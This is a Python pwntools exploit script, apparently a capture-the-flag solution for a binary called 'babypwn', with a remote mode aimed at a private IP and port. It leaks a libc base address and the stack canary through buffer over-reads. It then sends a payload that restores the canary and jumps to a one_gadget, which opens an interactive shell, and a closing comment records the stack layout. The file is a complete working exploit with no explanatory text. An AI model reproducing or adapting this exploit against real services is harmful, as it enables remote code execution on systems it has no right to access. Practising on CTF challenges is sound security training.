from pwn import *

context(os='linux',arch='amd64',aslr = 'False')#,log_level='debug')
local = 1
#log_level='debug'

if local:
	p = process("./babypwn")
	elf = ELF("./babypwn")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
	p = remote('172.29.20.118',9999)
	elf = ELF("./babypwn")

p.sendline("aeojj")
pause()
p.sendline("A"*0x6 + "B")
p.recvuntil("B\n")
leak = u64(p.recv(6) + "\x00\x00")
libcbase = leak - 0x6ffb4
print("libcbase = " + str(hex(libcbase)))
pause()
p.send("B"*0x28 + "C")
p.recvuntil("C")
canary = u64("\x00" + p.recv(7))
print("canary = " + str(hex(canary)))

stack_leak = u64(p.recv(6) + "\x00\x00")
print("stack_leak = " + str(hex(stack_leak)))
one_gadget = libcbase + 0x45216
payloadA = "A"*8 + p64(leak) + p64(0) + p64(canary) + p64(stack_leak - 0x10) + p64(canary) +p64(stack_leak) + p64(one_gadget)
print(hex(len(payloadA)))
p.send(payloadA) 
p.interactive()

'''
data struct in stack
0x7ffd60611c50:	0x0a42414141414141	0x00007fb8c7781fb4
0x7ffd60611c60:	0x0000000000000000	0xbf06268935332a00
0x7ffd60611c70:	0x00007ffd60611c80	0xbf06268935332a00
0x7ffd60611c80:	0x00007ffd60611c90	0x000055e17000b380

'''

